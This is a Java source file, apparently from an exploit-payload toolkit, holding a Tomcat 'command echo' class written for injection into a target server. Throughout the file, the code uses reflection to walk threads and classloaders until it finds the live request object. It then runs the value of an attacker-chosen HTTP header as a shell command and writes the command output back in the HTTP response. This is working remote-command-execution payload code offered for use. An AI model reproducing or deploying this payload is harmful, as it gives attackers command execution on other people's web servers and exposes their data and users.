package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

/**
 * @author Whoopsunix
 * 线程遍历找 Request 5-11
 */
@Middleware(Middleware.Tomcat)
@JavaClassType(JavaClassType.AutoFind)
@JavaClassModifiable({JavaClassModifiable.HEADER})
public class TomcatAutoRE {
    private static String HEADER;

    public TomcatAutoRE() {
        try {
            Object request = getTargetObject("org.apache.coyote.Request");
            Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});

            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});

            String result = exec((String) header);
            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            try {
                invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
            } catch (Exception e) {
                Class clazz;
                try {
                    clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                } catch (ClassNotFoundException e1) {
                    clazz = request.getClass().getClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
                }
                Object byteChunk = clazz.newInstance();
                invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
                invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
            }
        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        }catch (Exception e){
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new TomcatAutoRE().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 40);

        return result;
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }


    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

}
